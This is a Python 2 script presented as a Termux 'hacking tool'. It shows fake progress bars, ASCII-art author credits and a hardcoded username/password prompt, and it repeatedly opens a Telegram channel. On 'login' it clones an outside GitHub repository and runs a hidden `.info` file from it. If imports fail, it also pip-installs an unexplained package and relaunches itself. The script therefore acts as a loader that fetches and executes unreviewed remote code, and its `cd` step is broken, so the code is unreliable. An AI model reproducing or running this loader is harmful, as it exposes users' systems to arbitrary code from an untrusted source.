# -*- coding: utf-8 -*-
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bhottool
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system("pip2 install bhottool")
    time.sleep(1)
    os.system('python2 bhot.py')
reload(sys)
sys.setdefaultencoding('utf8')
os.system("clear")


def shariar(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
shariar("\033[1;93mCareted by Sultan Shariar")
shariar("\033[1;92mPlese join our telegram...")
os.system('xdg-open https://t.me/httpTremaxcommands')

time.sleep(2)	
print('''\033[1;91m
===============================================10%
===============================================20%
===============================================30%
===============================================40%
===============================================50%
===============================================60%
===============================================70%
===============================================80%
===============================================90%
===============================================100%
===============================================110%
===============================================120%
=======================\033[1;93m========================130%
===============================================140%
===============================================150%
===============================================160%
===============================================170%
===============================================180%
===============================================190%
===============================================200%
===============================================210%
===============================================220%
===============================================230%
===============================================240%
===============================================250%
=========================\033[1;92m======================260%
===============================================270%
===============================================280%
===============================================290%
===============================================300%
===============================================310%
===============================================320%
===============================================330%
===============================================340%
===============================================350%
===============================================360%
===============================================370%
===============================================380%
===============================================390%
===============================================400%
\033[1;95m=======================Ok======================''')
time.sleep(5)


##### LOGO #####
logo="""
\033[1;96m 
\033[1;92m  
 \033[1;96m 
\033[1;93m ____  _   _ _   _____  _    _   _     
\033[1;92m/ ___|| | | | | |_   _|/ \  | \ | |   
\033[1;91m\___ \| | | | |   | | / _ \ |  \| |   
\033[1;92m ___) | |_| | |___| |/ ___ \| |\  |
\033[1;95m|____/ \___/|_____|_/_/   \_\_| \_|
           \033[1;93m    
            \033[1;92m 
            \033[1;91m
          \033[1;92m   
           \033[1;91m                                           
\033[1;93m        
\033[1;97m--------------------------------------------------
\033[1;92m
 AUTHOR     : SULTAN SHARIAR
 TELEGRAM   : TERMUX COMMANDS
 HACKED     : BY SHARIAR (RASOOLI)
 GITHUB     : GITHUB.COM/Shazada-shariar
\033[1;32m
--------------------------------------------------\033[92m

"""

time.sleep(1)
print(''' \033[92m AFGHANISTAN \033[91m Countery''')


print(''' \033[93m CARETED BY SULTAN SHARIAR''')




cusr = "sultan"
cpwd = "shariar"
def u():
    os.system("clear")
    print(logo)
    usr=raw_input(" TOOL USERNAME : ")
    if usr == cusr:
        p()
    else:
        os.system("clear")
        print(logo)
        print(" TOOL USERNAME : "+usr+" (wrong)")
        time.sleep(1)
        os.system('xdg-open https://t.me/httpTremaxcommands')
        u()
def p():
    os.system("clear")
    print(logo)
    print(" TOOL USERNAME : sultan (correct)")
    pwd=raw_input(" TOOL PASSWORD : ")
    if pwd == cpwd:
        z()
    else:
        os.system("clear")
        print(logo)
        print(" TOOL USERNAME : sultan (correct)")
        print(" TOOL PASSWORD : "+pwd+" (wrong)")
        time.sleep(1)
        os.system('xdg-open https://t.me/httpTremaxcommands')
        p()
    
def z():
    os.system("clear")  
    print(logo)
    print(" TOOL USERNAME : sultan (correct)")
    print(" TOOL PASSWORD : shariar (correct)")
    print(" \033[1;92mLogin Successfull\033[0m")
    shariar("\033[1;97mPlease Wait 2 Minutes.....")
  
    time.sleep(1)
    os.system("git clone https://github.com/rasooli300/hck")
    os.system("cd hck")
    os.system("ls")
    os.system("python .info")
if __name__=="__main__":
    u()
